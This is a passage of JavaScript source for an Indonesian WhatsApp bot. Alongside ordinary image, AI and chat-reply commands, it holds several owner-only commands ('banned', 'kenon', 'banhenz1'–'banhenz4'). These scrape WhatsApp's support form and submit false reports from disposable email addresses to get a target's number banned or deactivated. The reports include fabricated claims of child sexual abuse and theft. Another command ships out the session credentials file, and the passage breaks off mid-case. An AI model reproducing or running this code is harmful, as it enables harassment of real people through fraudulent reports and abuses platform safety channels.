mem = await TelegraPh(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0].symbol))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case 'rentbot': {
if (m.isGroup) return replygcxeon(mess.private)
if (!isPrem) return replyprem(mess.premium)
rentfromxeon(Kyuu, m, from)
}
break
case 'listrentbot': 
try {
let user = [... new Set([...global.conns.filter(Kyuu => Kyuu.user).map(Kyuu => Kyuu.user)])]
te = "*rentbott List*\n\n"
for (let i of user){
y = await Kyuu.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Kyuu.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcxeon(`There are no users who have rented the bot yet`)
}
break
case 'idgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await Kyuu.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Kyuu.sendTextWithMentions(m.chat, teks, m)
             }
             break
 case 'verify': case 'banned': case 'kenon': case 'logout': {
 if (!isOwner) return m.replygcxeon(`Khusus Owner`)
 if (!q) return m.replygcxeon(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
            }
            break
            case 'ai': case 'openai':
try {
if (global.keyopenai === '') return replygcxeon("Api key limi exceeded");
if (!q) return replygcxeon(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
replygcxeon(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
replygcxeon("Sorry, there seems to be an error :"+ error.message);
}
}
break
case "aimage":
try {
if (global.keyopenai === '') return replygcxeon("Apikey limit exceeded");
if (!q) return replygcxeon(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
Kyuu.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replygcxeon("Sorry, there seems to be an error :"+ err);
}
break
case 'shutdown':
if (!isOwner) return replygcxeon(mess.owner)
replygcxeon(`Ba bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
Kyuu.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner\nt.me/runlinux\nt.me/qyray`}, { quoted: m })
}
break
case 'yt':
case 'youtube':
	Kyuu.sendMessage(from, 
{text: `Jangan Lupa Subscribe Yt gwa🗿👍🏻
*Link* : https://www.youtube.com/@zhecrax`},
{quoted: m})
        break
        case 'oke':
case 'okey':
	Kyuu.sendMessage(from, 
{text: `katakan otey🗿`},
{quoted: m})
        break
        case '🗿':
case 'njr':
	Kyuu.sendMessage(from, 
{text: `vn ara-ara kak`},
{quoted: m})
        break
        case 'gak':
case 'nanti':
case 'ntar':
	Kyuu.sendMessage(from, 
{text: `ayoklah kak🤧`},
{quoted: m})
        break
        case 'ydh':
case 'iya':
case 'ok':
	Kyuu.sendMessage(from, 
{text: `afah ingyah?`},
{quoted: m})
        break
        case 'jomblo':
	Kyuu.sendMessage(from, 
{text: `gw jomblo yah?`},
{quoted: m})
        break
        case 'nt':
        case 'sad':
	Kyuu.sendMessage(from, 
{text: `vn ara-ara aja kak🥹`},
{quoted: m})
        break
        case 'hay':
        case 'hy':
        case 'hi':
	Kyuu.sendMessage(from, 
{text: `hay juga tayanggg😍`},
{quoted: m})
        break   
        case 'assalamualaikum':
        case 'p':
	Kyuu.sendMessage(from, 
{text: `walaikumsalam`},
{quoted: m})
        break
        case 'tohd':
case 'removebg': {

const alias = {
    "tohd" : "torch-srgan",
    "removebg" : "removebg"
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'SanzV7') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await Kyuu.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    const response = `https://xzn.wtf/api/${aliasCommand}?url=${anu}&apikey=kikyy`

    Kyuu.sendMessage(from, { image: { url: response }, caption: 'nih' }, { quoted: m });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
        
        case 'remini': {
            if (isMedia) {
                    const media = await Kyuu.downloadAndSaveMediaMessage(quoted)
                    const anu = await TelegraPh(media)
                    await 
                    Kyuu.sendMessage(m.chat, { image: { url: `https://api.itsrose.site/image/unblur?url=${anu}&apikey=kyuu` }, caption: `Sukses membuat hd` }, { quoted: m })
                } else {
                reply('Reply gambar nya bang')
                }
            }
            break
        case 'jadianime': 
case 'toanime': {
if (`${global.wtf}` == 'SanzV7') return m.reply(global.noapikey)

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(global.wait)
  let response = `https://xzn.wtf/api/toanime?url=${util.format(anu)}&apikey=${global.wtf}`

Kyuu.sendMessage(from, { image: { url: response}, caption: command },{ quoted: m });
}
}
break
        case 'getsesi':
            if (!isOwner) return reply(mess.owner)
            reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
            let sesi = await fs.readFileSync('./kyuu/creds.json')
            Kyuu.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: m })
        break
case 'banhenz1': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'banhenz2': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Buenas noches Ocupo que desactiven mi numero por asunto de robo/extraviado [+62 XXX-XXXX-XXXX] porque tiene datos muy personales mios, por asuntos de trabajo, y porque contiene cuentas com numeros de cuentas muy secretas Por favor desactiven el numero Buenas dias/noches, gracia : ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'banhenz3': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I am a 9 year old woman I am still a student in elementary school!
There is someone unknown forcing me to have sex with me, and he has my photo to serve as a curse lineage.

Number: ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'banhenz4': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pussy just plugged in by that person! My pussy hurts until now please block the number: ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz1': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz2': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
